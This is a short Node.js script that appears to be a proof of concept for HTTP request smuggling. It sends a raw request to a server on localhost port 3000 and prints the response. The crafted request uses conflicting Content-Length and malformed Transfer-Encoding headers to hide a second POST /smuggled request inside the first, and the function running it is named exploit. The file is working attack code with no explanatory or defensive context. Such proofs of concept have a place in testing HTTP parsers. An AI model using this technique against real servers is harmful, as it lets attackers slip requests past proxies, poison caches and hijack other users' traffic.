const net = require('net')

const smuggledHttpRequest = `
GET / HTTP/1.1
Content-Type: text/plain; charset=utf-8
Host: localhost
Connection: keep-alive
Content-Length: 1
Transfer-Encoding: chunked, eee

XPOST /smuggled HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

name='joao'
`;

async function exploit() {
  return new Promise((resolve, reject) => {
    const clientSmuggled = net.connect(
      3000,
      () => {
        clientSmuggled.end(smuggledHttpRequest.replace(/\n/g, '\r\n'));
      });

    clientSmuggled.on("data", data => {
      console.log(`\n==== (HTTP SMUGGLED) ==== \n${data}`)

      resolve()
    })
  })

}